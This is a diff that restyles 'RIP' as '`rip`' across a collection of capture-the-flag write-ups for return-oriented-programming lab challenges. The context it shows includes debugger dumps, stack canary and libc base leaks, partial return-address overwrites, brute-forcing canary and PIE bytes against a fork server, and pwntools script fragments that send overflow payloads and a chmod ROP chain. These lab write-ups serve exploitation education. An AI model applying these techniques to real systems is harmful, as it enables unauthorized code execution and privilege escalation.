@@ -226,7 +226,7 @@ LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
  R15  0
  RBP  0x7ffdb569adc0 —▸ 0x7ffdb569adf0 ◂— 0
  RSP  0x7ffdb569ad80 —▸ 0x7ec61f9244a0 (_IO_file_jumps) ◂— 0
- RIP  0x4019cb (challenge+40) ◂— call read@plt
+ `rip`  0x4019cb (challenge+40) ◂— call read@plt
 ───────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────────────────────────────────────────────────────
  ► 0x4019cb <challenge+40>    call   read@plt                    <read@plt>
         fd: 0 (/dev/pts/0)
@@ -575,7 +575,7 @@ LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
  R15  0
  RBP  0x7fff0ca86680 —▸ 0x7fff0ca866b0 ◂— 0
  RSP  0x7fff0ca865e0 ◂— 0
- RIP  0x4023d0 (challenge+52) ◂— call read@plt
+ `rip`  0x4023d0 (challenge+52) ◂— call read@plt
 ──────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────────────────────────────────
  ► 0x4023d0 <challenge+52>    call   read@plt                    <read@plt>
         fd: 0 (/dev/pts/0)
@@ -1085,7 +1085,7 @@ LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
  R15  0
  RBP  0x7ffd74326e80 —▸ 0x7ffd74326eb0 ◂— 0
  RSP  0x7ffd74326e00 —▸ 0x7a3d9e3cb4a0 (_IO_file_jumps) ◂— 0
- RIP  0x402508 (challenge+40) ◂— call read@plt
+ `rip`  0x402508 (challenge+40) ◂— call read@plt
 ──────────────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────
  ► 0x402508 <challenge+40>    call   read@plt                    <read@plt>
         fd: 0 (/dev/pts/0)
@@ -1672,7 +1672,7 @@ LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
  R15  0
  RBP  0x7ffd7804ec30 —▸ 0x7ffd7804ec60 ◂— 0
  RSP  0x7ffd7804eb80 ◂— 0
- RIP  0x401f6c (challenge+263) ◂— call read@plt
+ `rip`  0x401f6c (challenge+263) ◂— call read@plt
 ──────────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────────────────────────────────────────────────────────────────────────
  ► 0x401f6c <challenge+263>    call   read@plt                    <read@plt>
         fd: 0 (/dev/pts/0)
@@ -2282,7 +2282,7 @@ LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
  R15  0
  RBP  0x7ffeefcd0a80 —▸ 0x7ffeefcd0ab0 ◂— 0
  RSP  0x7ffeefcd0a10 ◂— 0
- RIP  0x401ca9 (challenge+64) ◂— call read@plt
+ `rip`  0x401ca9 (challenge+64) ◂— call read@plt
 ────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────────────────────────────
  ► 0x401ca9 <challenge+64>    call   read@plt                    <read@plt>
         fd: 0 (/dev/pts/1)
@@ -2686,7 +2686,7 @@ LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
  R15  0
  RBP  0x7ffd2b5e9c20 —▸ 0x7ffd2b5e9c50 ◂— 0
  RSP  0x7ffd2b5e9bc0 —▸ 0x7bff6ba65740 ◂— 0x7bff6ba65740
- RIP  0x401e68 (challenge+137) ◂— call read@plt
+ `rip`  0x401e68 (challenge+137) ◂— call read@plt
 ────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────────────────
  ► 0x401e68 <challenge+137>    call   read@plt                    <read@plt>
         fd: 0 (/dev/pts/1)
@@ -3297,7 +3297,7 @@ LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
  R15  0
  RBP  0x7ffdc51a0370 —▸ 0x7ffdc51a03a0 ◂— 0
  RSP  0x7ffdc51a0310 ◂— 0
- RIP  0x402086 (challenge+40) ◂— call read@plt
+ `rip`  0x402086 (challenge+40) ◂— call read@plt
 ────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────────────────────────────────────────────────────────
  ► 0x402086 <challenge+40>    call   read@plt                    <read@plt>
         fd: 0 (/dev/pts/0)
@@ -3882,7 +3882,7 @@ LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
  R15  0
  RBP  0x7ffcd4fe1b30 —▸ 0x7ffcd4fe1b60 ◂— 0
  RSP  0x7ffcd4fe1ac0 —▸ 0x71c72d01a6a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
- RIP  0x40232e (challenge+137) ◂— call read@plt
+ `rip`  0x40232e (challenge+137) ◂— call read@plt
 ────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────────────────
  ► 0x40232e <challenge+137>    call   read@plt                    <read@plt>
         fd: 0 (/dev/pts/2)
@@ -4897,7 +4897,7 @@ LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
  R15  0
  RBP  0x7ffd745d5fc0 —▸ 0x7ffd745d5ff0 ◂— 0
  RSP  0x7ffd745d5f70 ◂— 0
- RIP  0x401c2c (challenge+40) ◂— call read@plt
+ `rip`  0x401c2c (challenge+40) ◂— call read@plt
 ─────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────────────────────────────────────────────────
  ► 0x401c2c <challenge+40>    call   read@plt                    <read@plt>
         fd: 0 (/dev/pts/4)
@@ -5453,7 +5453,7 @@ LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
  R15  0
  RBP  0x7ffd64369f30 —▸ 0x7ffd64369f60 ◂— 0
  RSP  0x7ffd64369ea0 ◂— 0xd68 /* 'h\r' */
- RIP  0x401c3d (challenge+235) ◂— call read@plt
+ `rip`  0x401c3d (challenge+235) ◂— call read@plt
 ─────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────────────────────────────────────────────────────────────────
  ► 0x401c3d <challenge+235>    call   read@plt                    <read@plt>
         fd: 0 (/dev/pts/0)
@@ -6017,7 +6017,7 @@ LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
  R15  0
  RBP  0x7ffd039a08f0 —▸ 0x7ffd039a0920 ◂— 0
  RSP  0x7ffd039a0890 ◂— 0
- RIP  0x4021fc (challenge+79) ◂— call read@plt
+ `rip`  0x4021fc (challenge+79) ◂— call read@plt
 ────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────────────────────────────────────────────────────────
  ► 0x4021fc <challenge+79>     call   read@plt                    <read@plt>
         fd: 0 (/dev/pts/2)
@@ -6415,7 +6415,7 @@ LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
  R15  0
  RBP  0x7fff7f3afc50 —▸ 0x7fff7f3afc80 ◂— 0
  RSP  0x7fff7f3afc00 ◂— 0
- RIP  0x40206d (challenge+233) ◂— call read@plt
+ `rip`  0x40206d (challenge+233) ◂— call read@plt
 ────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────────────────────────────────────────────────────────
  ► 0x40206d <challenge+233>    call   read@plt                    <read@plt>
         fd: 0 (/dev/pts/2)
@@ -7297,7 +7297,7 @@ LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
  R15  0
  RBP  0x7fff1ca542d0 —▸ 0x7fff1ca54300 ◂— 0
  RSP  0x7fff1ca54270 ◂— 0
- RIP  0x402178 (challenge+40) ◂— call read@plt
+ `rip`  0x402178 (challenge+40) ◂— call read@plt
 ────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────────────────────────────────────────────────────────
  ► 0x402178 <challenge+40>    call   read@plt                    <read@plt>
         fd: 0 (/dev/pts/1)
@@ -8848,7 +8848,7 @@ LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
  R15  0
  RBP  0x7ffe8c19d620 —▸ 0x7ffe8c19d650 ◂— 0
  RSP  0x7ffe8c19d5e0 —▸ 0x72b1dfd114a0 (_IO_file_jumps) ◂— 0
- RIP  0x4012da (challenge+78) ◂— call memcpy@plt
+ `rip`  0x4012da (challenge+78) ◂— call memcpy@plt
 ────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────────────────
  ► 0x4012da <challenge+78>    call   memcpy@plt                  <memcpy@plt>
         dest: 0x7ffe8c19d628 —▸ 0x401393 (main+165) ◂— lea rdi, [rip + 0xc8b]
@@ -9259,7 +9259,7 @@ LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
  R15  0
  RBP  0x7fff122d4e70 —▸ 0x7fff122d4ea0 ◂— 0
  RSP  0x7fff122d4de0 ◂— 0xd68 /* 'h\r' */
- RIP  0x6343e1bc3f5c (challenge+538) ◂— call read@plt
+ `rip`  0x6343e1bc3f5c (challenge+538) ◂— call read@plt
 ────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────────────────
  ► 0x6343e1bc3f5c <challenge+538>    call   read@plt                    <read@plt>
         fd: 0 (/dev/pts/1)
@@ -9687,7 +9687,7 @@ LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
  R15  0
  RBP  0x7ffe74b2f670 —▸ 0x7ffe74b2f6a0 ◂— 0
  RSP  0x7ffe74b2f5f0 —▸ 0x7060b4f9e4a0 (_IO_file_jumps) ◂— 0
- RIP  0x60730e465e7a (challenge+214) ◂— call read@plt
+ `rip`  0x60730e465e7a (challenge+214) ◂— call read@plt
 ────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────────────────
  ► 0x60730e465e7a <challenge+214>    call   read@plt                    <read@plt>
         fd: 0 (/dev/pts/1)
@@ -10097,7 +10097,7 @@ LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
  R15  0
  RBP  0x7ffe4e08de80 —▸ 0x7ffe4e08deb0 ◂— 0
  RSP  0x7ffe4e08dde0 ◂— 1
- RIP  0x5f25abcb9230 (challenge+1056) ◂— call read@plt
+ `rip`  0x5f25abcb9230 (challenge+1056) ◂— call read@plt
 ──────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────────────────────────────────────────────────
  ► 0x5f25abcb9230 <challenge+1056>    call   read@plt                    <read@plt>
         fd: 0 (/dev/pts/0)
@@ -10523,7 +10523,7 @@ LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
  R15  0
  RBP  0x7ffcacefda80 —▸ 0x7ffcacefdab0 ◂— 0
  RSP  0x7ffcacefda30 ◂— 0
- RIP  0x5979620690ee (challenge+738) ◂— call read@plt
+ `rip`  0x5979620690ee (challenge+738) ◂— call read@plt
 ──────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────────────────────────
  ► 0x5979620690ee <challenge+738>    call   read@plt                    <read@plt>
         fd: 0 (/dev/pts/1)
@@ -10998,7 +10998,7 @@ Breakpoint hit at 0x64b6f3eb9207
  R15  0
  RBP  0x7ffedfb5b160 ◂— 0
  RSP  0x7ffedfb5b0d0 ◂— 0
- RIP  0x64b6f3eb9207 (main+736) ◂— call read@plt
+ `rip`  0x64b6f3eb9207 (main+736) ◂— call read@plt
 ─────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────────────────────────────────────────────────
  ► 0x64b6f3eb9207 <main+736>    call   read@plt                    <read@plt>
         fd: 0 (/dev/pts/3)
@@ -11135,9 +11135,9 @@ hacker@return-oriented-programming~pivotal-pursuit-easy:~$ ROPgadget --binary /l
 0x00000000000578c3 : test dword ptr [rbp], edi ; add byte ptr [rax], al ; leave ; ret
 ```
 
-The saved RIP is `0x776c533e8083` (`__libc_start_main+243`, libc offset `0x24083`). The `leave ; ret` gadget is at libc offset `0x578c8`. Since both the saved RIP and the gadget live within libc, a partial overwrite of the saved RIP stays within the same mapping.
+The saved `rip` is `0x776c533e8083` (`__libc_start_main+243`, libc offset `0x24083`). The `leave ; ret` gadget is at libc offset `0x578c8`. Since both the saved `rip` and the gadget live within libc, a partial overwrite of the saved `rip` stays within the same mapping.
 
-A **2-byte** overwrite locks byte 2 of the resulting address to `0x3e` (the current value in the saved RIP), which constrains which ASLR base values can ever succeed, only those where byte 2 of `libc_base + 0x578c8` happens to equal `0x3e`, roughly a 2/256 chance. A **3-byte** overwrite instead replaces the low 3 bytes of the saved RIP entirely, leaving the upper 5 bytes intact (same libc mapping), which is both correct and far more efficient.
+A **2-byte** overwrite locks byte 2 of the resulting address to `0x3e` (the current value in the saved `rip`), which constrains which ASLR base values can ever succeed, only those where byte 2 of `libc_base + 0x578c8` happens to equal `0x3e`, roughly a 2/256 chance. A **3-byte** overwrite instead replaces the low 3 bytes of the saved `rip` entirely, leaving the upper 5 bytes intact (same libc mapping), which is both correct and far more efficient.
 
 ASLR randomizes 28 bits of the libc base (bits 12–39). Since the base is always page-aligned (low 12 bits = `0x000`), the lower nibble of byte 1 of any libc gadget address is always `0x0`. This leaves **4 bits (upper nibble of byte 1) × 8 bits (byte 2) = 4096 possible 3-byte patterns** to enumerate.
 
@@ -11176,7 +11176,7 @@ Stack:
 
 ═══════════════════════════════════════════════════════════════════════════════════
 rip --> main() return
-	// The saved RIP low 3 bytes are overwritten with our leave ; ret pattern.
+	// The saved `rip` low 3 bytes are overwritten with our leave ; ret pattern.
 	// main's own epilogue fires first.
 ═══════════════════════════════════════════════════════════════════════════════════
 
@@ -11482,7 +11482,7 @@ Breakpoint hit at 0x564274d9d258
  R15  0
  RBP  0x7ffdc2d2b1e0 ◂— 0
  RSP  0x7ffdc2d2b170 ◂— 0
- RIP  0x564274d9d258 (main+385) ◂— call read@plt
+ `rip`  0x564274d9d258 (main+385) ◂— call read@plt
 ──────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────────────────────────────
  ► 0x564274d9d258 <main+385>           call   read@plt                    <read@plt>
         fd: 0 (/dev/pts/2)
@@ -11596,9 +11596,9 @@ hacker@return-oriented-programming~pivotal-pursuit-hard:~$ ROPgadget --binary /l
 0x00000000000578c3 : test dword ptr [rbp], edi ; add byte ptr [rax], al ; leave ; ret
 ```
 
-The saved RIP is `0x7f5efdcc1083` (`__libc_start_main+243`, libc offset `0x24083`). The `leave ; ret` gadget is at libc offset `0x578c8`. Since both the saved RIP and the gadget live within libc, a partial overwrite of the saved RIP stays within the same mapping.
+The saved `rip` is `0x7f5efdcc1083` (`__libc_start_main+243`, libc offset `0x24083`). The `leave ; ret` gadget is at libc offset `0x578c8`. Since both the saved `rip` and the gadget live within libc, a partial overwrite of the saved `rip` stays within the same mapping.
 
-A **2-byte** overwrite locks byte 2 of the resulting address to `0xcc` (the current value in the saved RIP), which constrains which ASLR base values can ever succeed, only those where byte 2 of `libc_base + 0x578c8` happens to equal `0xcc`, roughly a 2/256 chance. A **3-byte** overwrite instead replaces the low 3 bytes of the saved RIP entirely, leaving the upper 5 bytes intact (same libc mapping), which is both correct and far more efficient.
+A **2-byte** overwrite locks byte 2 of the resulting address to `0xcc` (the current value in the saved `rip`), which constrains which ASLR base values can ever succeed, only those where byte 2 of `libc_base + 0x578c8` happens to equal `0xcc`, roughly a 2/256 chance. A **3-byte** overwrite instead replaces the low 3 bytes of the saved `rip` entirely, leaving the upper 5 bytes intact (same libc mapping), which is both correct and far more efficient.
 
 ASLR randomizes 28 bits of the libc base (bits 12–39). Since the base is always page-aligned (low 12 bits = `0x000`), the lower nibble of byte 1 of any libc gadget address is always `0x0`. This leaves **4 bits (upper nibble of byte 1) × 8 bits (byte 2) = 4096 possible 3-byte patterns** to enumerate.
 
@@ -11732,7 +11732,7 @@ Three problems to solve: canary, ASLR, and privilege. The trick is doing it in *
 #### Stage 1: Leak canary, restart `main()`
  
 1. Use the arbitrary read primitive to fetch `buf + 72`, exactly where the canary lives on the stack.
-2. Partially overwrite only the low 2 bytes of saved RIP with a value targeting `__libc_start_main+0x69` inside Libc. That offset contains:
+2. Partially overwrite only the low 2 bytes of saved `rip` with a value targeting `__libc_start_main+0x69` inside Libc. That offset contains:
 ```
 mov argv from lsm_stack → rsi
 mov argc from lsm_stack → edi
@@ -11744,7 +11744,7 @@ call *rax                       ← restarts main() cleanly
 4. `main()` restarts inside the same process, same canary, same ASLR layout.
 #### Stage 2: Leak libc, ROP chain
  
-1. Use the arbitrary read on `buf + 88` (saved RIP = `__libc_start_main+243`). Subtract the known offset to get the exact libc base.
+1. Use the arbitrary read on `buf + 88` (saved `rip` = `__libc_start_main+243`). Subtract the known offset to get the exact libc base.
 2. Compute all gadget and function addresses from libc base.
 3. Send `chmod("!", 0o777)` ROP chain, the binary runs with elevated privileges so the `chmod` succeeds.
 
@@ -11926,7 +11926,7 @@ Dump of assembler code for function main:
 End of assembler dump.
 ```
 
-Let's set a breakpoint at `main+582`, where the `read()` call is made, in order to find the buffer offset to the canary and saved RIP.
+Let's set a breakpoint at `main+582`, where the `read()` call is made, in order to find the buffer offset to the canary and saved `rip`.
 
 ```
 pwndbg> break *(main+582)
@@ -11973,7 +11973,7 @@ Breakpoint hit at 0x5e1c69bd94b3
  R15  0
  RBP  0x7ffe0e9228f0 ◂— 0
  RSP  0x7ffe0e922850 ◂— 0
- RIP  0x5e1c69bd94b3 (main+582) ◂— call read@plt
+ `rip`  0x5e1c69bd94b3 (main+582) ◂— call read@plt
 ─────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────────────────────────
  ► 0x5e1c69bd94b3 <main+582>    call   read@plt                    <read@plt>
         fd: 0 (/dev/pts/1)
@@ -12116,9 +12116,9 @@ hacker@return-oriented-programming~guarded-gadgets-easy:~$ readelf -s /lib/x86_6
 
 ### Leaking Libc base
 
-The binary doesn't print any Libc addresses. However, the saved RIP sitting at `buf + 88` on the stack points into `__libc_start_main+243`, because that is who called `main()`. We use the arbitrary read primitive to fetch that 8-byte value directly.
+The binary doesn't print any Libc addresses. However, the saved `rip` sitting at `buf + 88` on the stack points into `__libc_start_main+243`, because that is who called `main()`. We use the arbitrary read primitive to fetch that 8-byte value directly.
 
-The saved RIP address comes from `info frame`:
+The saved `rip` address comes from `info frame`:
 
 ```
 pwndbg> info frame
@@ -12131,7 +12131,7 @@ pwndbg> info frame
 
 `buf + 88 = 0x7ffe0e9228a0 + 88 = 0x7ffe0e9228f8` 
 
-The saved RIP value comes from the backtrace:
+The saved `rip` value comes from the backtrace:
 
 ```
 ─────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────────
@@ -12166,8 +12166,8 @@ pwndbg> p/x 0x737019aac083 - 0x24083
 $3 = 0x737019a88000   ← libc base (page-aligned)
 ```
 
-- Saved RIP address: `buf + 88 = 0x7ffe0e9228f8`
-- Saved RIP value: `0x737019aac083`
+- Saved `rip` address: `buf + 88 = 0x7ffe0e9228f8`
+- Saved `rip` value: `0x737019aac083`
 - `__libc_start_main+243` libc offset: `0x24083`
 - libc base: `0x737019aac083 - 0x24083 = 0x737019a88000`
 
@@ -12406,7 +12406,7 @@ context.arch = 'amd64'
 context.log_level = 'error'
 
 # Libc offsets
-LSM_243_OFF = 0x24083   # __libc_start_main+243 (saved RIP)
+LSM_243_OFF = 0x24083   # __libc_start_main+243 (saved `rip`)
 TARGET_OFF  = 0x24069   # restart: loads argv/argc/main then calls main
 pop_rdi_off = 0x23b6a
 pop_rsi_off = 0x2601f
@@ -12430,7 +12430,7 @@ for attempt in range(200):
         p.recvuntil(b' = 0x')
         canary = int(p.recvline().strip(), 16)
 
-        # Overwrite low 2 bytes of saved RIP → __libc_start_main+0x69 (calls main)
+        # Overwrite low 2 bytes of saved `rip` → __libc_start_main+0x69 (calls main)
         p.send(b'A' * 72 + p64(canary) + b'B' * 8 + restart_bytes)
 
         try:
@@ -12439,10 +12439,10 @@ for attempt in range(200):
             p.close()
             continue
 
-        # --- STAGE 2: Leak libc base via saved RIP, send chmod ROP chain ---
+        # --- STAGE 2: Leak libc base via saved `rip`, send chmod ROP chain ---
         buf2 = int(p.recvline().strip().rstrip(b'.'), 16)
 
-        # Leak saved RIP at buf + 88 → __libc_start_main+243 → libc base
+        # Leak saved `rip` at buf + 88 → __libc_start_main+243 → libc base
         p.recvuntil(b'Address in hex to read from:')
         p.sendline(hex(buf2 + 88).encode())
         p.recvuntil(b' = 0x')
@@ -12610,7 +12610,7 @@ Dump of assembler code for function main:
 End of assembler dump.
 ```
 
-Let's set a breakpoint at `main+356`, where the `read()` call is made, in order to find the buffer offset to the canary and saved RIP.
+Let's set a breakpoint at `main+356`, where the `read()` call is made, in order to find the buffer offset to the canary and saved `rip`.
 
 ```
 pwndbg> break *(main+356)
@@ -12654,7 +12654,7 @@ Breakpoint hit at 0x641a475e0a4a
  R15  0
  RBP  0x7ffcf1340cf0 ◂— 0
  RSP  0x7ffcf1340c20 ◂— 0
- RIP  0x641a475e0a4a (main+356) ◂— call read@plt
+ `rip`  0x641a475e0a4a (main+356) ◂— call read@plt
 ─────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────────────────────────
  ► 0x641a475e0a4a <main+356>    call   read@plt                    <read@plt>
         fd: 0 (/dev/pts/1)
@@ -12799,9 +12799,9 @@ hacker@return-oriented-programming~guarded-gadgets-easy:~$ readelf -s /lib/x86_6
 
 ### Leaking Libc base
 
-The binary doesn't print any Libc addresses. However, the saved RIP sitting at `buf + 136` on the stack points into `__libc_start_main+243`, because that is who called `main()`. We use the arbitrary read primitive to fetch that 8-byte value directly.
+The binary doesn't print any Libc addresses. However, the saved `rip` sitting at `buf + 136` on the stack points into `__libc_start_main+243`, because that is who called `main()`. We use the arbitrary read primitive to fetch that 8-byte value directly.
 
-The saved RIP address comes from `info frame`:
+The saved `rip` address comes from `info frame`:
 
 ```
 pwndbg> info frame
@@ -12814,7 +12814,7 @@ pwndbg> info frame
 
 `buf + 136 = 0x7ffcf1340c70 + 136 = 0x7ffcf1340cf8`
 
-The saved RIP value comes from the backtrace:
+The saved `rip` value comes from the backtrace:
 
 ```
 ─────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────────
@@ -12848,8 +12848,8 @@ pwndbg> p/x 0x757e58b54083 - 0x24083
 $3 = 0x757e58b30000   ← libc base (page-aligned)
 ```
 
-- Saved RIP address: `buf + 136 = 0x7ffcf1340cf8`
-- Saved RIP value: `0x757e58b54083`
+- Saved `rip` address: `buf + 136 = 0x7ffcf1340cf8`
+- Saved `rip` value: `0x757e58b54083`
 - `__libc_start_main+243` libc offset: `0x24083`
 - libc base: `0x757e58b54083 - 0x24083 = 0x757e58b30000`
 
@@ -12931,7 +12931,7 @@ context.arch = 'amd64'
 context.log_level = 'error'
 
 # Libc offsets
-LSM_243_OFF = 0x24083   # __libc_start_main+243 (saved RIP)
+LSM_243_OFF = 0x24083   # __libc_start_main+243 (saved `rip`)
 TARGET_OFF  = 0x24069   # restart: loads argv/argc/main then calls main
 pop_rdi_off = 0x23b6a
 pop_rsi_off = 0x2601f
@@ -12955,7 +12955,7 @@ for attempt in range(200):
         p.recvuntil(b' = 0x')
         canary = int(p.recvline().strip(), 16)
 
-        # Overwrite low 2 bytes of saved RIP → __libc_start_main+0x69 (calls main)
+        # Overwrite low 2 bytes of saved `rip` → __libc_start_main+0x69 (calls main)
         p.send(b'A' * 72 + p64(canary) + b'B' * 8 + restart_bytes)
 
         try:
@@ -12964,10 +12964,10 @@ for attempt in range(200):
             p.close()
             continue
 
-        # --- STAGE 2: Leak libc base via saved RIP, send chmod ROP chain ---
+        # --- STAGE 2: Leak libc base via saved `rip`, send chmod ROP chain ---
         buf2 = int(p.recvline().strip().rstrip(b'.'), 16)
 
-        # Leak saved RIP at buf + 88 → __libc_start_main+243 → libc base
+        # Leak saved `rip` at buf + 88 → __libc_start_main+243 → libc base
         p.recvuntil(b'Address in hex to read from:')
         p.sendline(hex(buf2 + 88).encode())
         p.recvuntil(b' = 0x')
@@ -13052,9 +13052,9 @@ Four problems to solve: canary, PIE, libc, and privilege. The server forks a chi
 
 The fork server keeps the same canary across all connections. Oracle: `### Goodbye!` at the end of output means `challenge()` returned cleanly (canary intact). No `### Goodbye!` means `__stack_chk_fail` killed the process before `main()` could print it.
 
-#### Stage 2: Brute-force saved RIP bytes 1–5 -> binary base
+#### Stage 2: Leaking the binary's base by brute-forcing saved `rip` bytes 1–5
 
-`read()` writes exactly the bytes we send and leaves everything above untouched on the stack. The saved RIP in `challenge()`'s frame equals `binary_base + 0x2ad3`. Byte 0 (`0xd3`) is fixed since `binary_base` is page-aligned. By sending `pad + canary + 0 (rbp) + known_prefix + guess_byte`, the remaining saved RIP bytes stay at their original stack values. The oracle is identical to Stage 1: `### Goodbye!` appears only when the assembled 8-byte saved RIP is valid.
+`read()` writes exactly the bytes we send and leaves everything above untouched on the stack. The saved `rip` in `challenge()`'s frame equals `binary_base + 0x2ad3`. Byte 0 (`0xd3`) is fixed since `binary_base` is page-aligned. By sending `pad + canary + 0 (rbp) + known_prefix + guess_byte`, the remaining saved `rip` bytes stay at their original stack values. The oracle is identical to Stage 1: `### Goodbye!` appears only when the assembled 8-byte saved `rip` is valid.
 
 #### Stage 3: Leak libc base via `puts(puts@got)`
 
@@ -13138,7 +13138,7 @@ LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
  R15  0
  RBP  0x7ffdccee6290 —▸ 0x7ffdccee62f0 ◂— 0
  RSP  0x7ffdccee6220 —▸ 0x7bb94f0d66a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
- RIP  0x5d08a200585e (challenge+212) ◂— call read@plt
+ `rip`  0x5d08a200585e (challenge+212) ◂— call read@plt
 ─────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────────────────────────
  ► 0x5d08a200585e <challenge+212>    call   read@plt                    <read@plt>
         fd: 0 (socket:[1379219698])
@@ -13277,15 +13277,15 @@ hacker@return-oriented-programming~rop-roulette-easy:~$ python3 -c "d=open('/lib
 
 ### Leaking binary base
 
-The saved RIP in `challenge()`'s frame comes from the backtrace:
+The saved `rip` in `challenge()`'s frame comes from the backtrace:
 
 ```
 1   0x5d08a2005ad3 main+457
 ```
 
-`challenge()`'s saved RIP = `0x5d08a2005ad3` = `binary_base + 0x2ad3`. Byte 0 is `0xd3` (fixed — `binary_base & 0xFF == 0` due to page alignment). Bytes 1–5 are random. Bytes 6–7 are always `0x00` (48-bit user-space address) and are never written.
+`challenge()`'s saved `rip` = `0x5d08a2005ad3` = `binary_base + 0x2ad3`. Byte 0 is `0xd3` (fixed — `binary_base & 0xFF == 0` due to page alignment). Bytes 1–5 are random. Bytes 6–7 are always `0x00` (48-bit user-space address) and are never written.
 
-By brute-forcing bytes 1–5 with the `### Goodbye!` oracle — the same oracle used for the canary — we recover the full saved RIP and compute:
+By brute-forcing bytes 1–5 with the `### Goodbye!` oracle — the same oracle used for the canary — we recover the full saved `rip` and compute:
 
 ```
 binary_base = saved_rip - 0x2ad3
@@ -13328,7 +13328,7 @@ wrong byte    → __stack_chk_fail kills process → ### Goodbye! never printed
 ═══════════════════════════════════════════════════════════════════════════════════
 ```
 
-#### Stage 2: Brute-force saved RIP bytes 1–5 -> binary base
+#### Stage 2: Leaking the binary's base by brute-forcing saved `rip` bytes 1–5 -> binary base
 
 ```
 <== Value is stored at the address
@@ -13344,7 +13344,7 @@ Stack (bruting byte 1 — 74 bytes sent):
                            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
             0x7ffdccee6290 │  00 00 00 00 00 00 00 00  │ ( saved RBP clobbered )
                            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-            0x7ffdccee6298 │  00 5d 08 a2 00 5a ?? d3  │ ( saved RIP )
+            0x7ffdccee6298 │  00 5d 08 a2 00 5a ?? d3  │ ( saved `rip` )
                            └───────────────────────────┘
                            ╎  .. .. .. .. .. .. .. ..  ╎
 
@@ -13353,8 +13353,8 @@ d3       byte 0 — fixed (binary_base & 0xFF == 0)
 5a..5d   bytes 2–7 — unwritten, retain original stack values
 
 ═══════════════════════════════════════════════════════════════════════════════════
-correct ?? → saved RIP valid → challenge() returns → ### Goodbye!
-wrong ??   → saved RIP invalid → process crashes → no ### Goodbye!
+correct ?? → saved `rip` valid → challenge() returns → ### Goodbye!
+wrong ??   → saved `rip` invalid → process crashes → no ### Goodbye!
 ═══════════════════════════════════════════════════════════════════════════════════
 
 binary_base = assembled_saved_rip - 0x2ad3
@@ -13571,7 +13571,7 @@ puts_got_off  = 0x4f30    # puts@got
 canary_off = 56
 rip_off    = 72
 
-# Byte 0 of saved RIP is fixed: binary_base & 0xFF == 0, so RET_ADDR & 0xFF
+# Byte 0 of saved `rip` is fixed: binary_base & 0xFF == 0, so RET_ADDR & 0xFF
 rip_fixed = bytes([ret_addr_off & 0xFF])   # [0xd3]
 
 def connect():
@@ -13606,10 +13606,10 @@ for i in range(7):
 canary = u64(known_canary)
 print(f'[*] Canary: {hex(canary)}')
 
-# --- STAGE 2: Brute-force saved RIP bytes 1–5 → binary base ---
+# --- STAGE 2: Leaking the binary's base by brute-forcing saved `rip` bytes 1–5 → binary base ---
